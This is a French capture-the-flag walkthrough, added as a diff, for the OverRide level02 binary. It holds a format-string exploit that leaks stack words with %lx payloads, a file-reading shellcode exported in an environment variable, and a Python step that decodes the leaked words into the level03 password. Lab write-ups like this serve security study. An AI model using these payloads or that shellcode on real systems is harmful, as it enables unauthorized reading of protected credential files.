@@ -1,0 +1,186 @@
+(gdb) shell file ./level02
+./level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
+
+Ce programme initialise plusieurs variable, et essai d'ouvrir le fichier .pass de l'utilisateur level03.
+S'il y arrive, (sinon exit, ce qui empeche l'utilisation de ltrace) il lance un formulaire de connection user passwd avec des inputs.
+Si les input ne correspondent pas aux attentes du programme, il nous le dit et exit
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: ok
+--[ Password: non
+*****************************************
+ok does not have access!
+
+En premier lieu, essayons d'overflow une input
+Cela ne fonctionne pas, soit on reecrit sur le fd qui essai de close et on crash, soit rien n'est reecrit dans la memoire et le programme exit encore.
+
+level02@OverRide:~$ { python -c 'print("a" * 250)'; python -c 'print("b" * 1020)'; } | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa does not have access!
+close failed in file object destructor:
+sys.excepthook is missing
+lost sys.stderr
+
+level02@OverRide:~$ { python -c 'print("a" * 80)'; python -c 'print("b" * 1020)'; } | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa does not have access!
+
+Plus bas dans le programme, quand il mentionne l'username, nous remarquons qu'il rentre l'input directement dans le premier argument de printf, ce qui nous ouvre la possiblite d'un format string exploit.
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %p
+--[ Password: %p
+*****************************************
+0x7fffffffe3e0 does not have access!
+
+level02@OverRide:~$ { python -c 'print("aaaa" + "%x " * 30 + "bbbb")'; python -c 'print("ffff")'; } | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+aaaaffffe3e0 0 66 2a2a2a2a 2a2a2a2a ffffe5d8 f7ff9a08 66666666 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 61616161 78252078 25207825 bbbb does not have access!
+
+Nous allons donc essayer de reecrire l'adresse de l'appel de la prochaine fonction pour faire diverger puts vers un shellcode de l'environnement
+
+level02@OverRide:~$ export SHELLCODE=$(python -c 'print("\x90" * 80 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level03/.pass")')
+
+Visiblement on ne peut pas acceder au adresse des variable d'environnement
+
+(gdb) x/32i *environ
+Cannot access memory at address 0xffffffffffffe5b8
+
+(gdb) disass 0x400680
+Dump of assembler code for function puts@plt:
+   0x0000000000400680 <+0>:	jmp    QWORD PTR [rip+0x200b5a]        # 0x6011e0 <puts@got.plt>
+   0x0000000000400686 <+6>:	push   0x1
+   0x000000000040068b <+11>:	jmp    0x400660
+End of assembler dump.
+
+(gdb) disass 0x6011e0
+Dump of assembler code for function puts@got.plt:
+   0x00000000006011e0 <+0>:	xchg   BYTE PTR [rsi],al
+   0x00000000006011e2 <+2>:	add    BYTE PTR [rax],al
+   0x00000000006011e5 <+5>:	add    BYTE PTR [rax],al
+   0x00000000006011e7 <+7>:	add    BYTE PTR [rsi+0x4006],dl
+End of assembler dump.
+
+Dans le cas ou nous voulions sauter dans un endroit du code pour executer le bin sh present, c'est aussi complique car les adresse du programme contienne des octet null
+
+(gdb) disass main
+	...
+   0x0000000000400a85 <+625>:	mov    edi,0x400d32
+   0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>
+
+Me vient alors l'idee de remplacer le parametre de puts (l'appel suivant printf) par le contenu lu dans le fichier .pass precedemment.
+
+(gdb)
+0x0000000000400901 in main ()
+1: x/5i $pc
+=> 0x400901 <main+237>:	call   0x400690 <fread@plt>
+   0x400906 <main+242>:	mov    DWORD PTR [rbp-0xc],eax
+   0x400909 <main+245>:	lea    rax,[rbp-0xa0]
+   0x400910 <main+252>:	mov    esi,0x400bf5
+   0x400915 <main+257>:	mov    rdi,rax
+(gdb) i r
+rax            0x7fffffffe420	140737488348192
+rbx            0x0	0
+rcx            0x1	1
+rdx            0x29	41
+rsi            0x1	1
+rdi            0x7fffffffe420	140737488348192
+
+(Premier argument == rdi)
+
+(par ailleurs, n'oublions pas que le binaire est en 64bits cette fois-ci)
+
+level02@OverRide:~$ { python -c 'print("%lx " * 22)'; python -c 'print("a" * 8)'; } | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+7fffffffe3e0 0 61 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe5d8 1f7ff9a08 6161616161616161 0 0 0 0 0 0 0 0 0 0 0 100000000 0 756e505234376848  does not have access!
+
+Plutot que de controler le flux d'execution du programme, nous avons effectivement comme mentionne plus haut le contenu de .pass quelque part dans la stack, essayons de voir si nous pouvons le recuperer avec le format strings et le lire directement a l'oeil nu, au vu de l'output que l'on vient d'obtenir.
+
+level02@OverRide:~$ { python -c 'print("%c " * 30)'; python -c 'print("a" * 8)'; } | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+�  a * * � a              H Q X s M  %   c  does not have access!
+
+Notre buffer a l'air de se trouver dans le lot d'adresse affiche
+Utilisons donc un script bash pour pouvoir les afficher sans craindre d'overwrite l'adresse de fd
+
+level02@OverRide:~$ for((i = 1; i < 35; i++)); do echo -n "$i " && echo "AAAAAAAAAA %$i\$lx" | ./level02 | grep AA ; done
+1 AAAAAAAAAA 7fffffffe3e0 does not have access!
+2 AAAAAAAAAA 0 does not have access!
+3 AAAAAAAAAA 0 does not have access!
+4 AAAAAAAAAA 2a2a2a2a2a2a2a2a does not have access!
+5 AAAAAAAAAA 2a2a2a2a2a2a2a2a does not have access!
+6 AAAAAAAAAA 7fffffffe5d8 does not have access!
+7 AAAAAAAAAA 1f7ff9a08 does not have access!
+8 AAAAAAAAAA 0 does not have access!
+9 AAAAAAAAAA 0 does not have access!
+10 AAAAAAAAAA 0 does not have access!
+11 AAAAAAAAAA 0 does not have access!
+12 AAAAAAAAAA 0 does not have access!
+13 AAAAAAAAAA 0 does not have access!
+14 AAAAAAAAAA 0 does not have access!
+15 AAAAAAAAAA 0 does not have access!
+16 AAAAAAAAAA 0 does not have access!
+17 AAAAAAAAAA 0 does not have access!
+18 AAAAAAAAAA 0 does not have access!
+19 AAAAAAAAAA 0 does not have access!
+20 AAAAAAAAAA 100000000 does not have access!
+21 AAAAAAAAAA 0 does not have access!
+22 AAAAAAAAAA 756e505234376848 does not have access!
+23 AAAAAAAAAA 45414a3561733951 does not have access!
+24 AAAAAAAAAA 377a7143574e6758 does not have access!
+25 AAAAAAAAAA 354a35686e475873 does not have access!
+26 AAAAAAAAAA 48336750664b394d does not have access!
+27 AAAAAAAAAA 0 does not have access!
+28 AAAAAAAAAA 4141414141414141 does not have access!
+29 AAAAAAAAAA 6c24393225204141 does not have access!
+30 AAAAAAAAAA 78 does not have access!
+31 AAAAAAAAAA 0 does not have access!
+32 AAAAAAAAAA 0 does not have access!
+33 AAAAAAAAAA 0 does not have access!
+34 AAAAAAAAAA 0 does not have access!
+
+Nous avons bien plusieurs suite de caracteres, dont 4242...
+Dechiffrons celles qui semble interessante
+
+4242424242424242
+4242424242424242
+;)
+
+En l'occurence elle se trouve dans la memoire avant les variable ayant recue nos input, donc de 22 a 26
+
+>>> list1
+['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d']
+>>> code = ""
+>>> for x in list1:
+...     code += bytes.fromhex(x).decode('ascii')[::-1]
+...
+>>> code
+'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'
